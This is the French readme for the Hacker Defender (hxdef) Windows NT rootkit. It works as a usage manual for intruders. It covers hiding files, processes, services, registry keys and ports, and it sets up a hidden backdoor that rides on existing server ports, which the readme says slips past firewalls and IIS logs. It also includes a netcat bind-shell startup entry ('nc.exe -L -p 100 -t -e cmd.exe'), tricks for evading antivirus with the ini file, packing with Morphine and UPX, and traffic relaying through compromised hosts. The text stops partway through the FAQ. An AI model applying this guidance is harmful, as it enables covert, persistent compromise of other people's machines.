======================[ Hacker defender - French readme ]=======================

                                  NT Rootkit
                                  ----------

 Authors:        Holy_Father <holy_father@phreaker.net>
                 Ratter/29A <ratter@atlas.cz>
 Version:        1.0.0
 Birthday:       01.01.2004
 Home:           http://rootkit.host.sk, http://hxdef.czweb.org

 Betatesters:    ch0pper <THEMASKDEMON@flashmail.com>
                 aT4r <at4r@hotmail.com>
                 phj34r <phj34r@vmatrics.net>
                 unixdied <0edfd3cfd9f513ec030d3c7cbdf54819@hush.ai>
                 rebrinak
                 GuYoMe
                 ierdna <ierdna@go.ro>
                 Afakasf <undefeatable@pobox.sk>

 Readme:         Czech & English par holy_father
                 French par GuYoMe



=====[ 1. Sommaire ]============================================================

 1. Sommaire
 2. introduction
	2.1 L'idee
	2.2 Licence
 3. Utulisation
 4. Fichier ini
 5. Backdoor
	5.1 La Redirection
 6. Problemes techniques
	6.1 Version
	6.2 "hook"ed API
	6.3 Bugs connus
 7. Faq
 8. Fichiers



=====[ 2. introduction ]========================================================

	Hacker defender (hxdef) est un  rootkit for Windows NT 4.0, Windows 2000 
and Windows XP, qui devrait egalment fonctionner sur les derniers OS base sur
NT.
	La pluspart du code est ecrite en Delphi 6. Certaines des nouvelles 
fonctions sont ecrites en assembler. Le Driver est ecrit en C.
	La backdor et son client sont ecrit en Delphi 6.
	Vous verez parfois ecrit "fichierini" ou "inifile" c'est la meme chose.

Le programme utilise adapted LDE32
LDE32, Length-Disassembler Engine, 32-bit, (x) 1999-2000 Z0MBiE
special edition for REVERT tool
version 1.05

Le programme utilise Superfast/Supertiny Compression/Encryption library
Superfast/Supertiny Compression/Encryption library.
(c) 1998 by Jacky Qwerty/29A.


=====[ 2.1 L'idee ]=============================================================

	Le principe du programme est de modifier quelques segments en memoire 
pour chaque processus. Cette reecriture peut modifier le comportement de ces 
processus. Cette reecriture ne doit pas affecter les stabilite du systeme ni 
celle du processus en lui meme.
	Le programme doit etre completement invisible pour les autres. Une fois 
installe l'utilisateur peut cacher fichiers, processus, des services, des 
drivers systeme, des clefs de registre, des ports ouverts et enfin modifier
l'espace disque disponible.
	Le programme installe une backdoor cachee, s'enregistre comme un 
service systeme cache, et installe le system driver cache. 
	La technologie de la backdoor nous autorise l'ajout de la redirection. 


=====[ 2.2 Licence ]============================================================

	Ce projet est open source à partir de la version 1.0.0.

	Et biensur les auteurs ne sont en rien responsable de l'utilisation que 
vous ferez de Hacker defender.



=====[ 3. Utilisation ]=========================================================

	Les commandes de  hxdef sont relativement simples:

	>hxdef100.exe [fichierini]
ou 
	>hxdef100.exe [switch] 


	Le nom par defaut pourle fichier ini est inIFILE.ini ou inIFILE est le  
nom de l'executable du programme sans extension. C'est ce qui ets utilise si 
vous lancez le programme hxdef sans specifier le nom du fichier ini ou si vous
le lancez avec un switch (donc le fichier ini inifile is hxdef100.ini).

	Ces options sont disponibles:

	-:installonly	-	install le service, sans le lancer
	-:refresh	-	Met à jour les modifications faites dans le 
				fichier ici
	-:noservice	-	N'install pas le service et lance juste l'exe 
				normalement
	-:uninstall	-	Desinstall à 100% hxdef (de meme en stoppant 
				le service)

Exemple:
	>hxdef100.exe -:refresh

	Hxdef avec le fichier ini par defaut est pret à etre lance sans qu'il 
n'y ait de changement dans le fichier ini. Il est fortement recommande de creer
vos propres "reglages". (Cf. section 4. pour plus d'informations à ce propos).
	Les commutateurs -:refresh et -:uninstall doivent etre lance depuis le 
path exact ou se situe le fichier exe de hxdef (à noter quelquepart...sinon 
vous ne pourrez desinstaller hxdef).



=====[ 4. Le fichier ini ]======================================================

	Le fichier ini doit contenir 9 sections: [Hidden Table], 
[Root processus], [Hidden Services], [Hidden RegKeys], [Hidden RegValues], 
[Startup Run], [Free Space], [Hidden Ports] and [Settings]. 
	Dans [Hidden Table], [Root processus], [Hidden Services] et [Hidden 
RegValues] vous pouvez utiliser "*" pour remplacer la fin d'une suite de 
charactere (exemple ci-dessous). 
	L'Asterisque ne peut etre utilise qu'à la fin d'une suite de charactere
puisque tout ce qui se situe apres cette asterique sera ignore. 
	Tous les espaces situes avant et apres la suite de characteres seront
ignores.

Exemple:
[Hidden Table]
hxdef*

Seront cachees tous les fichiers, repertoires et processus qui commence par 
"hxdef".

	Hidden Table est une liste de fichiers, repertoires et processus qui 
seront caches. Tous les fichiers et repertoires de cette liste disparaitrons de 
tout explorateur de fichiers.
	Les programmes de cette liste seront egalement invisibles dans le 
gestionnaire des taches. Verifiez bien que les fichiers de hxdef (ini et exe) 
et de votre backdoor sont dans cette liste. 

	Root processus est une liste de programmes qui ne serons pas affectees 
par hxdef. 
Vous ne pourrez voir les fichiers et repertoires caches qu'avec les programmes 
que vous aurez places dans cette liste.
	Donc, les "root processus" sont ceux que va utliser la personen qui a 
installe le rootkit. etre mentionne dans les "root processus" ne signifie pas 
etre cache.
	Il est possible d'avoir des process root qui sont caches et vice versa.

	Hidden Services est une liste de service et de nom de driver qui seront
caches dans in liste des services et drivers installes. Le nom du service 
du rootkit est HackerDefender100 par default, le nom du driver driver pour le 
rootkit est HackerDefenderDrv100. Ces 2 informations peuvent etre changees dans
le fichier ini.

	Hidden RegKeys est une liste de clef registre qui seront cachees. Le 
Rootkit installe 4 clefs dans le registre : HackerDefender100, 
LEGACY_HackerDefender100, HackerDefenderDrv100 et LEGACY_HackerDefenderDrv100 
par defaut. Si vous renommez le nom du service ou du driver vous devrez 
egalement modifier cette liste. 
	Les 2 premieres clefs registre pour le service et le driver ont le meme
nom. Les 2 suivantes sont LEGACY_NAME. Par exemple si vous changez le nom de 
votre service en BoomThisIsMySvc votre entree dans le registre sera :
LEGACY_BOOMTHISISMYSVC.

	Hidden RegValues est une liste de valeurs registre qui seront cachees.

	Startup Run est une liste de programes que le rootkit lancera apres 
s'etre lance lui meme. Ces programmes auront les memes droits que le rootkit. 
Le nom du programme sera separe de ces arguments par un point d'interrogation. 
N'utilisez pas le charactere ". 

	Utilisez les methodes habuituelles pour lancer des programmes:
Vous pouvez utiliser les raccourcis suivants:
	%cmd%		- stands for system shell exacutable + path
			  (e.g. C:\winnt\system32\cmd.exe)
	%cmddir%	- stands pour le repertoire contenant cmd.exe
			  (e.g. C:\winnt\system32\)
	%sysdir%	- stands le repertoire system
			  (e.g. C:\winnt\system32\)
	%windir%	- stands pour le repertoire windows
			  (e.g. C:\winnt\)
	%tmpdir%	- stands le repertoire temp
			  (e.g. C:\winnt\temp\)

Exemple:
1)
[Startup Run]
c:\sys\nc.exe?-L -p 100 -t -e cmd.exe

netcat-shell est lance en port 100 apres le demarrage du rootkit.

2)
[Startup Run]
%cmd%?/c echo Rootkit started at %TIME%>> %tmpdir%starttime.txt

Ceci inscrira l'heure dans temporary_directory\starttime.txt
(e.g. C:\winnt\temp\starttime.txt) à chaque fois que le rootkit demarre


	Free Space est une liste de disques durs et un nombre de bytes que nous 
voulons rajouter à l'esapce disque reellement disponible. 
Le format est : X:NUM où X est la lettre du HD et NUM est le nombre de bytes 
qui seront ajoutes à l'espace disque reellement disponible. 
free bytes. 

Exemple:
[Free Space]
C:123456789

Ceci ajoutera environ 123 MB d'espace dique disponible en plus de ce qui est 
reellement dispo sur le dique C.


	Hidden Ports est uneliste de ports que vous voulez cacher vis à vis 
d'applications comme OpPorts, FPort, Active Ports, Tcp View etc. Il doit y 
avoir au moins 2 lignes: 
	Le format de la premiere ligne est : TCP:tppport1,tcpport2,tcpport3...
	Le format de la seconde ligne est : UDP:udpport1,udpport2,udpport3... 

Exemple:
1)
[Hidden Ports]
TCP:8080,456

Ceci cachera 2 ports : 8080/TCP and 456/TCP

2)
[Hidden Ports]
TCP:8001
UDP:12345

Ceci cachera 2 ports : 8001/TCP and 12345/UDP

3)
[Hidden Ports]
TCP:
UDP:53,54,55,56,800

Ceci cachera 5 ports : 53/UDP, 54/UDP, 55/UDP, 56/UDP and 800/UDP


      	Les reglages contiennes 8 valeurs: Password, BackdoorShell,
FileMappingName, ServiceName, ServiceDisplayName, ServiceDescription,
DriverName et DriverFileName.
	Le Password est une chaine de 16 character max utilisee lorsque la 
backdoor est installee or La redirection. Le Password peut etre plus court, 
le reste est rempli avec des espaces.
	BackdoorShell est le nom du fichier à copier depuis le system shell qui
est cree par la backdoor dans le repertoire temporaire. 
	FileMappingName est le nom de la memoire partagee ou les reglages pour
les processus hackes processus sont stockes.
	ServiceName est le nom du service du rootkit.
	ServiceDisplayName est le nom affiche du service du rootkit
	ServiceDescription est la description du service du rootkit
	DriverName est le nom du drivers du rootkit
	DriverFileName est le nom du fichier du drivers du rootkit

Exemple:
[Settings]
Password=hxdef-rulez
BackdoorShell=hxdefá$.exe
FileMappingName=_.-=[Hacker Defender]=-._
ServiceName=HackerDefender100
ServiceDisplayName=HXD Service 100
ServiceDescription=powerful NT rootkit
DriverName=HackerDefenderDrv100
DriverFileName=hxdefdrv.sys
	
Cela siginie que le pass de votre backdoor est "hxdef-rulez", la backdoor 
va copier le system shell file (habituellement cmd.exe) vers "hxdefá$.exe" 
dans le repertoire temp. Le nom de la memoire partagee sera 
"_.-=[Hacker Defender]=-._". Le nom du service sera "HackerDefender100", et 
sont nom affiche sera "HXD Service 100", sa description sera 
"poweful NT rootkit". Le nom du driver est "HackerDefenderDrv100". Le Driver 
sera stocke dans un fichier appele "hxdefdrv.sys".


	Les characters |, <, >, :, \, / et " sont ignore dans toutes les lignes
sauf [Startup Run], [Free Space] et [Hidden Ports] et la valeures dans 
[Settings] apres premier = character. L'utilisation de ces characteres peut 
immuniser votre fichier ini contre les antivirus.

Exemple:
[H<<<idden T>>a/"ble]
>h"xdef"*
r|c<md\.ex<e::


est la meme choses que


[Hidden Table]
hxdef*
rcmd.exe

voyez hxdef100.ini et hxdef100.2.ini pour plus d'exemples

	Toutes les chaines du fichier ini exceptes celles des Settings et 
Startup Run sont sensible aux majuscules/minuscules.



=====[ 5. Backdoor ]============================================================

	Le rootkit se sert de certaines fonctions de l'API servant à recevoir 
des packets depuis internet. Si les donnees en reception sont encodees en 256 
bits, le mot de passe et le service sont verifies, ensuite une copy du shell 
est cree dans un repertoire temporaire, et les donnees entrantes sont alors 
redirigees vers ce shell.
	Puisque le rootkit ce sert de tous les processus du system tous les 
ports TCP sur tous les servers seront des backdoors. Par exemple, si la cible a 
le port 80 ouvert pour le HTTP, alors ce port sera egalement disponible pour se 
connecter à la backdoor. Exception faite des ports ouverts pas des processus 
sytem. Cette backdoor fonctionnera seulement sur les servers où le buffer est 
au moins de 256 bits. Mais ce dispositif est present sur presque tous les 
serveurs standard comme Apache, IIS, Oracle.  
La Backdoor est cachee car ses packets passe par les serveurs habituellement 
deja installes sur le system. Donc vous ne serez pas capable de la trouver avec
un portscanner classique et cette backdoor fonctionnera aisement à travers un 
firewall. A l'exception de certains proxy qui sont orientes specifiquement vers
un protocole comme pour les proxy FTP ou HTTP.
	Pendant les test effectues sur des serveurs IIS nous avons constates 
que lors des connections sur la backdoor aucune n'etaient loggees, les serveurs 
FTP et SMTP log seuelement une deconnection à la fin.
Donc , si vous lancer hxdef sur une machine ayant un serveur IIS le ports http 
est probablement le meilleur port pour la backdoor (80).

	Vous devez utiliser un Client special pour vous connecter à la 
backdoor.
	Le programme bdcli100.exe est fait pour.

Utilisation: bdcli100.exe host port motdepasse

Exemple:
	>bdcli100.exe www.windowsserver.com 80 hxdef-rulez

Cette commande nous connectera sur www.windowsserver.com si vous avez 
correctement configure hxdef.

	Le client pour la version 1.0.0 n'est pas compatible avec des server 
utilisant une ancienne version de hxdef.



=====[ 5.1 Redirigeur ]=========================================================

	La redirection est base sur la technologie de la backdoor. Les premiers
packets de connection sont les memes que dans la backdoor. Cela signifie que 
vous pouvez utiliser les memes ports que pour la backdoor. Ensuite les packets
sont specifiques à la redirection. Ces packets sont crees par la base de 
redirection qui est lancees sur l'ordinateur de celui qui l'utilise. 
Les premiers packets d'une connection redirigee definissent le port et ca 
cible.
	La base de redirections sauvgardes ces reglages dans le fchier ini dont
le nom depend du nom du fichier exe (par default : rdrbs100.ini). Si ce fichier
n'existe pas alors une base est cree automatiquement. Il est preferable de ne 
pas modifier ce fichier ini à la main. Tous les reglages peuvent etre fait 
depuis la console de base.
	Si nous voulons utliser la redirection sur des servers ou le rootkit 
est installe, nous devons lancer la base de redirection sur notre propre 
machine auparavant. Ensuite in console il faudra creer les ports à mapper et à 
router avec le serveur hxdef. Enfin nous pourrons nous conecter sur le port 
choisi et transferer des donnees. Les donnees redirigees sont codees avec le 
mot de passe du rootkit.
	Dans cette version la vitesse de transfert est de 256 kBps.
	La redirection n'est pas faite pour des connections à haut debit. 
	La redirection ne fonctionne que sur les systeme ou le rootkit est 
lance .
	La redirection ne fonctionne qu'avec le protocole TCP.
	Dans cette version la base est controllee avec 19 commands. les 
majuscules ne sont pas prisent en comtpe. Leur fonction est decrite in 
commande HELP. Pendant le demarage de la base les commandes de la startup-list 
sont executees. les commandes de la startup-list sont editees avec les 
commandes qui commence par SU.
	La redirection fait la differences entre 2type de connection (HTTP et 
les autres).
Si la connection est d'un autre type les packets ne sont pas changes. Si c'est 
de type HTTP les parametres du Host dans les entetes HTTP sont modofiees vers 
le server cible. Le nombre de redirections maximum est de 1000 sur une base.

	La base de redirection marche parfaitement sur les boxes NT. C'est
seulement sur les programmes NT qui ont une tray-icon que vous pouvez cacher
la console avec la commande HIDE. C'est seulement sur les bases NT qu'il peut 
etre lacne en mode silence où il' ny a pas de sortie, pas d'icone et seul les
commandes de la startup list sont lancees.


Exemples:
1) pour avoir les infos sur les ports mappes:

	>MPINFO
	No mapped ports in the list.

2) lancez MPINFO pour "startup-list" et vous aurez acces aux commandes de la 
"startup-list":

	>SUADD MPINFO
	>sulist
	0) MPINFO

3) utilisation de la commande HELP:

	>HELP
	Type HELP COMMAND for command details.
	Valid commands are:
	HELP, EXIT, CLS, SAVE, LIST, OPEN, CLOSE, HIDE, MPINFO, ADD, DEL, 
	DETAIL,	SULIST, SUADD, SUDEL, SILENT, EDIT, SUEDIT, TEST
	>HELP ADD
	Create mapped port. You have to specify domain when using HTTP type.
	usage: ADD <LOCAL PORT> <MAPPinG SERVER> <MAPPinG SERVER PORT> <TARGET 
	SERVER> <TARGET SERVER PORT> <PASSWORD> [TYPE] [DOMAin]
	>HELP EXIT
	Kill this application. Use DIS flag to discard unsaved data.
	usage: EXIT [DIS]

4) rajouter un port mappe, nous voulons attendre des connection sur le port 
100, le rootkit est installe sur l'ip 200.100.2.36 sur le port 80, le server 
cible est : www.google.com sur le port 80, le pass du rootkits est bIgpWd, le 
type de connection est HTTP, ip du server cible (www.google.com) - ceci est 
indispensable - est 216.239.53.100:

	>ADD 100 200.100.2.36 80 216.239.53.100 80 bIgpWd HTTP www.google.com

La commande ADD peut etre lancee sans paramtres, dans ce cas chaque parametre 
est demande successivement.

5) nous pouvons maintenant verifier les ports mappes avec MPINFO:
	
	>MPINFO
	There are 1 mapped ports in the list. Currently 0 of them open.

6) enumeration des ports mappes:

	>LIST
	000) :100:200.100.2.36:80:216.239.53.100:80:bIgpWd:HTTP

7) description detaillee d'un port mappe:
	
	>DETAIL 0
	Listening on port: 100
	Mapping server address: 200.100.2.36
	Mapping server port: 80
	Target server address: 216.239.53.100
	Target server port: 80
	Password: bIgpWd
	Port type: HTTP
	Domain name for HTTP Host: www.google.com
	Current state: CLOSED

8) nous pouvons egalement verifier sir le rootkit est installe avec un mot de 
passe pour mapper le server 200.100.2.36 (ce n'est pas indispensable):

	>TEST 0
	Testing 0) 200.100.2.36:80:bIgpWd - OK

Si le test foire ca donne :
	
	Testing 0) 200.100.2.36:80:bIgpWd - FAILED

9) le port est toujours ferme, nous devons l'ouvrir avec la commande OPEN,
(et inversement avec la commande CLOSE), nous pouvons utiliser le parametre ALL 
quand nous voulons appliquer la commande sur tous les ports de la liste, l'etat 
en cours est sauvegarder ensuite :
	
	>OPEN 0
	Port number 0 opened.
	>CLOSE 0
	Port number 0 closed.

ou

	>OPEN ALL
	Port number 0 opened.
	
10) pour sauvgarder les reglages actuels : SAVE ce qui sauvgadera tout dans le 
fichier ini (la sauvgarder est egalement fait à chaque commande EXIT)
	
	>SAVE
	Saved successfully.


	Open port est tout ce dont nous avons besion pour transferer des 
donnees. Vous pouvez à present ouvrir votre brouteur favori et tapper
http://localhost:100/
	S'il n'y a pas de probleme voudevrez tomber sur www.google.com.
	Les premiers packets de la connection peuvent etre retardes de 5 
secondes, pour le reste la limite est celle del a vitesse du server, votre 
connection à internet et la technologie de la redicrection qui fonctionne à 
256 kBps dans cette version.



=====[ 6. Problemes techniques ]================================================

	Cette section est destinee aux beta testers et aux developpers.



=====[ 6.1 Version ]============================================================

TODO    -       unifier la backdoor, le redirector et le manager de fichier
	-	ecrire une nouvelle et meilleur backdoor
        -       rajouter le support du proxy à la backdoor
	-	cacher dans les session à distance (netbios, registre distant)
	-	dissimulation avance in memoire
	-	"hook" NtNotifyChangeDirectoryFile

1.0.0   +       open source

0.8.4	+	Readme en francais
	+	NtCreateFile sont "hooked" pour cacher les 
		modifications de fichiers
	+	le nom du mailslot de hxdef est dynamique
	+	switch -:uninstall enlever et mettre à jour hxdef
	+	-:refresh ne peut etre lance que depuis le fichier .exe 
	+	nouveau readme - plusieurs corrections, plus d'informations, 
                faq
	+       raccourcis pour [Startup Run]
        +       modification du "free space" (espace libre) par 
		NtQueryVolumeinformationFile
"hook"
	+       port ouverts caches via NtDeviceIoControlFile "hook"
        +       beaucoup plus d'infos in section [Comments] du fichier 
		inifile
	+       support du Ctrl+C dans les sections backdoor
        +       FileMappingName est une option à present
        +       Root Processes sont lances avec les droits system
        +       La dissimulation est manipulee via NtQuerySysteminformation

class 16
        +       utilisation du driver system
	+	antiantivirus inifile
        +       plus stable quand Windows boot et reboot
	+	les programmes sont en meoire sont mieux caches
	-	bug trouve dans le client de la quand on faire un copier/coller 
		depuis le clipboard
	x	trouve et repare : bug dans le nom du service
	x	trouve et repare : n° de pid croissant via NtOpenProcess "hook"
        x       trouve et repare : bug dans NtReadVirtualMemory "hook"
	x	trouve et repare : plusieurs petits bugs
        x       trouve et repare : le nom du shell de la backdoor

0.7.3   +       methode directe de "hooking"
        +       fichiers dissimules via NtQueryDirectoryFile "hook"
        +       fichiers dissimules dans ntvdm via NtVdmControl "hook"
        +       nouvelle technique de "hooking" des process via NtResumeThread 
		"hook"
        +       les processus sont infectes via LdrinitializeThunk "hook"
        +       les clefs regitre sont cachees via NtEnumerateKey "hook"
	+	les valeurs registre sont cachees via NtEnumerateValueKey 
		"hook"
	+	dll infection via LdrLoadDll "hook"
        +       plus de reglages dans le fichier ini
        +       support du mode sans echec
	+	la dissimulation dans la memoire passe maintenant via 
		NtReadVirtualMemory "hook"
        x       resolu : debugger bug
        x       resolu : w2k MSTS bug
        x       trouve et resolu le bug zzZ-service

0.5.1	+	plus jamais de "hooking WSOCK"
	x	bug resolu avec MSTS

0.5.0	+	la redirection de bas niveau est basee sur la technique de la 
		backdoor
	+	protection par mot de passe
	+	le nom du fichier ini depend du nom du fichier exe
	+	la stabilite de la backdoor est amelioree
	-	La redirections est limitee à  256 kBps,
		implementation imparfaite de La redirection,
		designe imparfait de La redirection
	-	il y a une chance de detecter le rootkit avec des objets 
		utilisant des lien symboliques
	-	bug trouve dans la connection avec MS Termnial Services
	-	bug trouve dans la dissimulation de fichier avec les 
		applications 16 bits
	x	bug trouve et resolu dans l'enumeration des services
	x	bug trouve et resolu dans "hooking servers"

0.3.7	+	possibilite de changer mes reglages pendant que le rootkit 
		fonctionne
	+	le charactere "etoile" dans les noms des fichiers caches, 
		processus et services
	+	possibilite d'ajouter des programmes au lancement du rootkit
	x	bug resolu dans la dissimulation de services sur Windows NT 4.0

0.3.3	+	stabilite reellement amelioree
	x	tous les bugs relatif à Windows XP sont resolus
        x	bug trouve et resolu dans la dissimulation dans le registre
	x	bug trouve et resolu dans la backdoor avec plus de clients

0.3.0	+	la backdoor esy plus stable et contient de nouvelles 
		fonctionnalites 
	+	Le shell de la backdoor se lance toujours avec les droits 
		system
	+	Le shell de la backdoor est cache 
	+	dissumulation des clefs registre
	x	bug trouve et resolu dans la section root processus
	-	bug dans XP apres reboot

0.2.6	x	bug resolu dans la backdoor

0.2.5	+	console totalement interactive
	+	la clef d'identification de la backdoor est maintenant de 256 
		bits
	+	installation amelioree de la backdoor
	-	bug dans la backdoor

0.2.1	+	toujours lance en tant que service

0.2.0	+	installation en tant que service system
	+	dissimulation in base de donnee des services installes
	+	backdoor cachee
	+	ne fonctionne plus avec windows

0.1.1	+	cache dans la liste des taches
	+	utilisation - possibilite de specifier le nom du fichier ini
	x	bug resolu in communication
	x	bug resolu en utilisant advapi
	-	bug trouve avec le debuggers

0.1.0	+	infection des services system
	+	code plus petit et plus radpie, programme plus stable
	x	bug in communication resolu

0.0.8	+	dissimulation de fichier
	+	infection de nouveaux processus
	-	impossibilite d'infecter des services system
	-	bug in communication



=====[ 6.2 "hooked" API ]=======================================================

Liste des fonctions API qui sont "hooked":

Kernel32.ReadFile
Ntdll.NtQuerySystemInformation (class 5 a 16)
Ntdll.NtQueryDirectoryFile
Ntdll.NtVdmControl
Ntdll.NtResumeThread
Ntdll.NtEnumerateKey
Ntdll.NtEnumerateValueKey
Ntdll.NtReadVirtualMemory
Ntdll.NtQueryVolumeInformationFile
Ntdll.NtDeviceIoControlFile
Ntdll.NtLdrLoadDll
Ntdll.NtOpenProcess
Ntdll.NtCreateFile
Ntdll.NtLdrInitializeThunk
WS2_32.recv
WS2_32.WSARecv
Advapi32.EnumServiceGroupW
Advapi32.EnumServicesStatusExW
Advapi32.EnumServicesStatusExA
Advapi32.EnumServicesStatusA



=====[ 6.3 Buges connus ]=======================================================

	Il y a un bug connu dans cette version. 

1)
	Le client de la backdoor peut planter quand vous faites un copier/
coller depuis le clipboard en utilisant le click droit in console ou en 
utilisant le menu de la console. Vous pouvez toujours copier/coller en 
utilisant Ctrl+ins, Shift+ins si le programme lance in console le supporte.


	Si vous pensez avoir detecte un bug rapporte le sur la board publique
(ou sur la board des betatesters si vous etes un betatester) ou sur 
<rootkit@host.sk>. 
Mais soyez certain d'avoir lu ce readme, la section faq , la "todo liste" et
la board et que vous n'avez rien trouve à propos de ce que vous voulez ecrire.



=====[ 7. Faq ]=================================================================

	A cause de nombreuses question evidentes sur la board j'ai decide de 
creer une section faq dans ce readme. Avant de demander quoi que ce soit sur la
board ayez l'obligeance de relire au moins 2 fois cette section. Ensuite lisez 
les anciens messages sur la nboard et enfin, si vous ne trouvez pas reponse à 
votre question, alors mettez votre question sur la board.
	
	Les question sont:
1) J'ai telecharhe hxdef, je l'ai lance mais n'arrive plus à linstaller. 
Comment faire pour le desinstaller alors que je ne peut en voir ni les 
processus ni les services ni les fichiers?
2) quelqu'un a hacje ma box, lance hxdef et je ne peut le desinstaller. Comment
puis-je le desinatller et enlever toutes les backdoors?
3) Est-ce que ce cprogramme est detecte par les antivirus? Si oui comment y 
remedier?
4) Je ne peut me connecter sur la backdoor sur les ports  135,137,138,139,445 
alors qu'il sont ouverts. Pourquoi?
5) est il possible d'avoir un processus cache mais que le fichier reste 
visible?
6) Comment cacher svchost.exe et d'autres que je vois dans le gestionnaire des 
taches?
7) J'utilise DameWare et je peux voir tout ce qui devrais etre cache, est-ce un
bug?
8) Mais tout le monde peut voir mes fichiers caches par netbios. Que puis-je 
faire?
9) Le client de la backdoor ne fonctionne pas. Tout semble ok, mais apres la 
connection je ne peut rien tapper et l'ecran de la console ets noir. Que 
dois-je faire?
10) Quand aurons-nous la nouvelle version?
11) la commande net.exe peut stopper des services caches, est-ce un bug?
12) Existe-t-il une facon de detecter le rootkit?
13) Donc, dans quelle mesure est -il difficile de detecter hxdef ? et est-ce 
que quelqu'un a fait un programme qui fait ca? 
14) Donc, comment puis-je le detecter?
15) Est-ce que le numero de version qui commence par 0. signifie que les 
versions disponible ne sont pas stables?
16) Quand publierz vous la source? in version 1.0.0, mais pour quand?
17) JE voudrais devenir betatester, que dois-je faire?
18) Est-il legal d'utiliser hxdef?
19) est-il possible de mettre à jour une ancienne version de hxdef avec une 
nouvelles ? est-ce possible sans rebooter la machine?
20) Est-il preferable d'utiliser -:unisinstall ou net stop ServiceName?
21) J'aime vraiment ce programme. puis-je offrir une petite donation à son 
auteur?
22) Y a t il une chance de cacher c:\temp et non c:\winnt\temp?
23) Je peut voir le mot de pass dans le fichier ini en texte non code ! 
Comment est-ce possible?
24)  Si j'ai un porcessus qui est cache dans  Hidden Table et qu'll attend des 
connection sur un port, ce port sera t il automaqituqement cache ou devrais-je 
le rajouter dans hidden tabble?



	Maintenant les reponses:



1) J'ai telecharhe hxdef, je l'ai lance mais n'arrive plus à linstaller. 
Comment faire pour le desinstaller alors que je ne peut en voir ni les 
processus ni les services ni les fichiers?

R: Si vous laissez les parametres par defaut vous pouvez stopper le shell et 
stopper le service:

	>net stop HackerDefender100

Hxdef est fait pour se desinstaller si vous stop le service.
Cle aura un effet similaire à -:uninstall mais vous navez pas besion de savoir 
ou est hxdef

SI vous avez change le nom de service dan le fichier ini, tappez ca à la ligne 
de commande:

	>net stop ServiceName

où ServiceName est la valeur que vous avez choisie pour le ServiceName dans le 
fichier ini.

Si vous oubliez le nom du service vous pouvez rebooter depuis un disque de boot
et essayer de trouver hxdef ou son fichier ini.


2) quelqu'un a hacje ma box, lance hxdef et je ne peut le desinstaller. Comment
puis-je le desinatller et enlever toutes les backdoors?

R: La seule solution veritable est de reinstaller votre Windows. 
Si vous bne voullez pas en arriver là vous n'avez plus qua chercher le fichier 
ini comme in question 1 audessus. Ensuite apres lavoir deinstalle de votre
systeme regarde dans le fichier ini et essaye de trouver tous les fichiers 
inscirt in "HIDDEN TABLE". 
Ensuite vous devrier verifier ces fichiers et les effacer.


3) Est-ce que ce cprogramme est detecte par les antivirus? Si oui comment y 
remedier?

R: Oui, et le fichier exe n'est pas le seul à etre detecte. Quelques antivirus
detectent le fichier ini et le driver.
La reponse à la seconde question est oui. Sur le homapge de hxdef vous pouvez 
telecharger un utilitare : morphine.
Si vous utilisez morphine sur hxdef vous obtiendrez un nouveau fichier exe 
 qui ne peut etre detecte par les antivirus.
Le fichier ini est egalement encode pour battre les antivirus. Vous pouvez 
rajouter des charactere inutiles pour mettre en deroute les antivirus.
Cf. section 4 pour plus d'explications. Vous pouvez egalement voir et comparer
les 2 fichiers ini d'exemple fournis avec hxdef. les 2 sont equivalents mais le
premier utilise les characteres speciaux pour vaincre les antivirus.
CErtainement que la meilleur manicere est d'utiliser UPX avant morphine.
UPX compactera et Morphine protegera contre les antivirus.
Referez vous au readme de Morphine pour plus d'infos.


4) Je ne peut me connecter sur la backdoor sur les ports  135,137,138,139,445 
alors qu'il sont ouverts. Pourquoi?

R: Comme explique dans 5. la Backdoor a besion de serverutilisant un buffer 
egal ou superieur à  256 bits.
Les ports systeme riquement de ne pas marcher non plus. si la backdoor semble 
deficiante, utilisez une netcat.


5) Est il possible d'avoir un processus cache mais que le fichier reste 
visible?

R: Non. Et vous ne pouvez pas non plus avoir un fichier cache sur le disk d'un 
processus visible dans le gestionnaire des taches.


6) Comment cacher svchost.exe et d'autres que je vois dans le gestionnaire des 
taches?

R: C'est une tres mauvaise idee. S vous cachez des processus systeme le windows
va cracher tres souvent. L'interet de Hxdef est justement que vous n'etes pas 
oblige de nommer vos process comme des processus syteme. Nomme les nimporte 
comment et cachez les (Hidden Table)


7) J'utilise DameWare et je peux voir tout ce qui devrais etre cache, est-ce un
bug?

R: Non. ceci n'est pas un bug mais une fonction à installer voir "todo list" 
sur le oueb.


8) Mais tout le monde peut voir mes fichiers caches par netbios. Que puis-je 
faire?

R: Mettez vos fichiers profondement enfouis dans l'arborescence systme.


9) Le client de la backdoor ne fonctionne pas. Tout semble ok, mais apres la 
connection je ne peut rien tapper et l'ecran de la console ets noir. 
Que dois-je faire?

R: Vous utilisez probalement le mauvais port pour vous connecter.
Hxdef essaie de detecter les mauvais ports et vous deconnect, mais de temp en 
temps il n'ets pas capable de detecter que vous utilisez un mauvais port. 
Donc utilisez un autre port.


10) Quand aurons-nous la nouvelle version?

R: Les developpeurs de ce programme le font sur leur temp libre. Il ne font pas
d'argent avec ca et n'en veulent pas. Il n'y a pour le moment que 2 coders et 
nous pensons que c'est suffisant pour ce projet.
Cela signifie que le code ne sera pas aussi rapidement ecrit que chez microsoft 
et que vous ne deverez pas reclamer les nouvelle sversion sans cesse. 
Contrairement au produits Ms notre programme est gratuit 
et nous avons de bon beta tester qui test enormement ce programme, pour que les
version publiques soient le plus stables possible.


11) La commande net.exe peut stopper des services caches, est-ce un bug?

R: Non, ce n'est pas un bug c'est une fonction. C'est pourquoi il fo se 
souvenir du nom du service que vous avez cache car vous etes le seul à pourvoir 
le connaitre. Ne soyez pas effrayes que l'on vous detecte ainsi.


12) Existe-t-il une facon de detecter le rootkit?

R: Oui. Elles sont tres nombreuse comme pour tous les rootkit et celui ci ne 
fait pas (et ne peut pas faire) exception. 
Chaque rootkit peut etre detecte. 
La seule question est quel est la difficulte et quelqu'un peut il faire un 
programme qui le detecte?



13) Donc, dans quelle mesure est -il difficile de detecter hxdef ? et est-ce 
que quelqu'un a fait un programme qui fait ca? 

R: C'est tres facile de detecetr ca, mais je ne connais aujourd'hui aucun 
utilitaire que ia cette fonction.


14) Donc, comment puis-je le detecter?

R: devinez :)


15) Est-ce que le numero de version qui commence par 0. signifie que les 
versions disponible ne sont pas stables?

R: Non, cela signifie qu'il reste des choses à implanter et que le code source 
n'est pas accessible pendant toute la phase de developpement.


16) Quand publierz vous la source? in version 1.0.0, mais pour quand?

R: Je ne sais vraiment pas quand. Il y a un certain nombre de choses à 
implanter avant de sortir la 1.0.0. Cela peut prendre de 6 mois à 1 an ou plus.


17) JE voudrais devenir betatester, que dois-je faire?

